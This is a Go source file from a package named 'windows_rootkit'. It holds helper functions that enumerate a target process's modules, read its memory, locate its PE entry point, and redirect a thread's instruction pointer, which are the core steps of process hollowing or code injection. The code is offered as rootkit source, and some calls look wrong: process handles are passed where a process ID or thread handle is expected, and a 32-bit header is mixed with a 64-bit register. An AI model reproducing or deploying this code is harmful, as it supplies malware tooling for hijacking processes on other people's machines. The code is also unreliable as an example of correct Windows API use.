package windows_rootkit

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
)

// GetProcessModules function retrieves the base addresses of all modules associated with the specified process.
func GetProcessModules(processHandle syscall.Handle) ([]uintptr, error) {
	var me32 MODULEENTRY32
	me32.Size = uint32(unsafe.Sizeof(me32))

	// Create a snapshot of the modules in the specified process.
	handle, _, err := ProcCreateToolhelp32Snapshot.Call(TH32CS_SNAPMODULE32, uintptr(processHandle))
	if handle == 0 {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	// Retrieve the first module in the snapshot.
	ret, _, err := ProcModule32First.Call(handle, uintptr(unsafe.Pointer(&me32)))
	if ret == 0 {
		// If returns zero, it means there are no modules to enumerate.
		if err != nil {
			// If an error occurred, handle it.
			if err.Error() != "The operation completed successfully." {
				fmt.Println("Error retrieving module information:", err)
			}
		}
		return nil, nil
	}

	// Iterate through all modules and retrieve their base addresses.
	var modules []uintptr
	modules = append(modules, me32.BaseAddress) // Add the first module's base address.
	for {
		// Retrieve information about the next module in the snapshot.
		ret, _, err := ProcModule32Next.Call(handle, uintptr(unsafe.Pointer(&me32)))
		if ret == 0 {
			// If returns zero, it means there are no more modules to enumerate.
			if err != nil {
				// If an error occurred, handle it.
				if err.Error() != "The operation completed successfully." {
					fmt.Println("Error retrieving module information:", err)
				}
			}
			break
		}
		// Append the base address of the current module to the list.
		modules = append(modules, me32.BaseAddress)
	}

	return modules, nil
}

// ReadProcessMemoryCustom function reads memory from a specified process.
func ReadProcessMemoryCustom(processHandle syscall.Handle, address uintptr, data []byte) (int, error) {
	var bytesRead uintptr
	_, _, err := ReadProcessMemory.Call(uintptr(processHandle), address, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)), uintptr(unsafe.Pointer(&bytesRead)))
	if err.(syscall.Errno) != 0 {
		return 0, fmt.Errorf("ReadProcessMemory failed: %v", err)
	}
	return int(bytesRead), nil
}

// GetProcessEntryPoint function retrieves the entry point of a target process.
func GetProcessEntryPoint(processHandle syscall.Handle) (uintptr, error) {
	// Get the base address of the process module
	modules, err := GetProcessModules(processHandle)
	if err != nil {
		return 0, fmt.Errorf("failed to get process modules: %v", err)
	}
	var processModuleBase uintptr = modules[0] // Assuming the main module is the first one

	// Read the DOS header to find the address of the NT headers
	var dosHeader [IMAGE_DOS_HEADER]byte
	_, err = ReadProcessMemoryCustom(processHandle, processModuleBase, dosHeader[:])
	if err != nil {
		return 0, fmt.Errorf("failed to read DOS header: %v", err)
	}
	var ntHeaderOffset uint32 = binary.LittleEndian.Uint32(dosHeader[0x3C:])
	var ntHeadersAddress uintptr = uintptr(processModuleBase) + uintptr(ntHeaderOffset)

	// Read the optional header to get the entry point
	var optionalHeader IMAGE_OPTIONAL_HEADER32
	var optionalHeaderBytes []byte = (*[unsafe.Sizeof(optionalHeader)]byte)(unsafe.Pointer(&optionalHeader))[:]
	_, err = ReadProcessMemoryCustom(processHandle, ntHeadersAddress+0x18, optionalHeaderBytes)
	if err != nil {
		return 0, fmt.Errorf("failed to read optional header: %v", err)
	}

	var entryPoint uintptr = uintptr(optionalHeader.AddressOfEntryPoint) + processModuleBase

	return entryPoint, nil
}

// SetProcessEntryPoint function sets the entry point of a target process.
func SetProcessEntryPoint(processHandle syscall.Handle, entryPoint uintptr) error {
	// Get the context of the main thread of the target process.
	var context Context
	context.ContextFlags = CONTEXT_FULL
	_, _, err := ProcGetThreadContext.Call(uintptr(processHandle), uintptr(unsafe.Pointer(&context)))
	if err != nil {
		return err
	}

	// Modify the instruction pointer (Rip) in the context to point to the new entry point.
	context.Rip = uint64(entryPoint)

	// Set the modified context to update the entry point of the target process.
	_, _, err = ProcSetThreadContext.Call(uintptr(processHandle), uintptr(unsafe.Pointer(&context)))
	if err != nil {
		return err
	}

	return nil
}
